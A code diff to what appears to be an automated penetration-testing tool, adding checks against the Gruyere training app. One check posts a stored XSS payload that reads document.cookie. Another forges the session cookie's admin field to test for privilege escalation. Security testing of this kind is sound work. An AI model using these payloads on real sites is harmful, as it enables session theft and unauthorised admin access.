@@ -442,16 +442,59 @@ def _test_authenticated_access(
                 all_other_users.extend(u for u in found if u not in all_other_users)
 
     # Build next_step_hints: what the system should do next based on findings
+    # --- Stored XSS: post a snippet with XSS payload as authenticated user ---
+    stored_xss_found = False
+    try:
+        stored_payload = "<script>alert('aegispt-stored-xss-'+document.cookie)</script>"
+        snippet_post = client.post(
+            f"{base_origin}{instance}/newsnippet.gtl",
+            data={"snippet": stored_payload, "private": ""},
+            cookies=auth_headers,
+        )
+        if snippet_post.status_code < 400:
+            # Check if our payload appears in the snippets feed (unencoded)
+            feed = client.get(f"{base_origin}{instance}/snippets.gtl", cookies=auth_headers)
+            if stored_payload in feed.text or "aegispt-stored-xss" in feed.text:
+                stored_xss_found = True
+                data_seen.append("Stored XSS: payload persisted in snippets feed (unencoded)")
+                privilege_escalation.append("Stored XSS confirmed: payload executes for all visitors")
+    except httpx_client.HTTPError:
+        pass
+
+    # --- Cookie manipulation: try escalating privileges via cookie tampering ---
+    cookie_manip_found = False
+    if cookie_value:
+        try:
+            # Gruyere cookie: HASH|uid|is_admin|is_author
+            # Try replacing is_admin field with 'admin'
+            parts = cookie_value.split("|")
+            if len(parts) >= 3:
+                tampered_parts = parts[:]
+                tampered_parts[2] = "admin"  # set is_admin
+                tampered_cookie = "|".join(tampered_parts)
+                tampered_resp = client.get(
+                    f"{base_origin}{instance}/",
+                    cookies={cookie_name: tampered_cookie},
+                )
+                body_tampered = tampered_resp.text or ""
+                # Look for admin indicators
+                if any(kw in body_tampered.lower() for kw in ["admin", "reset", "quit", "/admin"]):
+                    admin_links = re.findall(r'href=["\']([^"\']*admin[^"\']*)["\']', body_tampered, re.IGNORECASE)
+                    if admin_links:
+                        cookie_manip_found = True
+                        data_seen.append(f"Cookie manipulation: admin access with tampered cookie, found: {admin_links[:2]}")
+                        privilege_escalation.append("PRIVILEGE ESCALATION: tampered cookie grants admin interface access")
+        except httpx_client.HTTPError:
+            pass
+
     next_steps: list[dict[str, Any]] = []
     if all_other_users and accessible:
-        # IDOR: try accessing other users' data with our session
-        first_accessible = accessible[0]["url"] if accessible else base_url
         next_steps.append({
             "tool": "idor-bac",
             "reason": f"Other users found: {all_other_users}. Test if our session can access their private data.",
             "params": {
                 "discovered_users": all_other_users,
-                "authenticated_base_url": first_accessible,
+                "authenticated_base_url": accessible[0]["url"] if accessible else base_url,
             },
         })
     if privilege_escalation:
@@ -468,6 +511,8 @@ def _test_authenticated_access(
         "pages_tested": len(probe_targets),
         "pages_accessible": len(accessible),
         "other_users_found": all_other_users,
+        "stored_xss_found": stored_xss_found,
+        "cookie_manipulation_found": cookie_manip_found,
         "next_step_hints": next_steps,
     }
 
@@ -613,11 +658,22 @@ def execute_xss_proof(
                         "evidence": check,
                     })
 
+    # Collect next_step_hints from all findings and expose at top level
+    # so _maybe_queue_next_step_hints in tasks.py can read them directly
+    all_hints: list[dict[str, Any]] = []
+    for f in findings:
+        ev = f.get("evidence") or {}
+        aa = ev.get("authenticated_access") or {}
+        for h in aa.get("next_step_hints") or []:
+            if h not in all_hints:
+                all_hints.append(h)
+
     result = {
         "tool": "xss-proof",
         "targets": [base_target],
         "checks": checks,
         "findings": findings,
+        "next_step_hints": all_hints,  # TOP LEVEL for orchestrator to read
         "summary": {
             "finding_count": len(findings),
             "critical_count": sum(1 for f in findings if f.get("severity") == "critical"),
